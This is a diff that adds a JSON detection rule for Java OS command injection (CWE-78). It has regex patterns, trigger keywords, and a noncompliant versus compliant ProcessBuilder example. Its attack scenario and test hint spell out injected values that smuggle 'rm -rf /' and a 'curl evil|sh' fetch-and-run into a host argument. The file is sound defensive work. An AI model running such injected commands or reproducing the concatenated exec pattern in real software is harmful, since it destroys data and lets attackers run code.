@@ -1,0 +1,52 @@
+{
+  "cwe_id": "CWE-78",
+  "name": "OS command injection via Runtime.exec/ProcessBuilder concatenation",
+  "rank": 0,
+  "kev": false,
+  "task_triggers": [
+    "runtime.exec",
+    "processbuilder",
+    "shell",
+    "run command",
+    "exec",
+    "system command",
+    "invoke binary",
+    "cli"
+  ],
+  "patterns": [
+    {
+      "lang": "java",
+      "confidence": "high",
+      "re": "Runtime\\.getRuntime\\(\\)\\s*\\.exec\\s*\\(\\s*(?:\"[^\"]*\"|[A-Za-z_]\\w*)\\s*\\+"
+    },
+    {
+      "lang": "java",
+      "confidence": "high",
+      "re": "new\\s+ProcessBuilder\\s*\\(\\s*\"[^\"]*\"\\s*\\+"
+    },
+    {
+      "lang": "java",
+      "confidence": "high",
+      "re": "\\.command\\s*\\(\\s*\"[^\"]*\"\\s*\\+"
+    },
+    {
+      "lang": "java",
+      "confidence": "high",
+      "re": "[\"'](?:-c|/c)[\"']\\s*,\\s*[\"'][^\"']*[\"']\\s*\\+"
+    },
+    {
+      "lang": "java",
+      "confidence": "high",
+      "re": "(?:\\.exec|new\\s+ProcessBuilder|\\.command)\\s*\\(\\s*(?:new\\s+String\\[\\]\\s*\\{[^}]*\\+|String\\.format\\()"
+    }
+  ],
+  "attack_scenario": "Attacker supplies host = example.com; rm -rf / (or `curl evil|sh`); the concatenated command line executes the injected commands with the app's privileges.",
+  "negative_test_hint": [
+    "submit host = \"example.com; rm -rf /\" and assert the injected command never runs because the value stays a single ProcessBuilder argument"
+  ],
+  "exemplar": {
+    "noncompliant": "Process p = Runtime.getRuntime().exec(\"nslookup \" + host);",
+    "compliant": "Process p = new ProcessBuilder(\"nslookup\", host).start();",
+    "explanation": "Runtime.exec(String) and ProcessBuilder built by string concatenation invoke a shell-like split in which attacker metacharacters inject extra commands with the app's privileges. Passing a fixed program plus each argument as a separate array/varargs element keeps user input a single inert argument that can never be reinterpreted as shell syntax."
+  }
+}
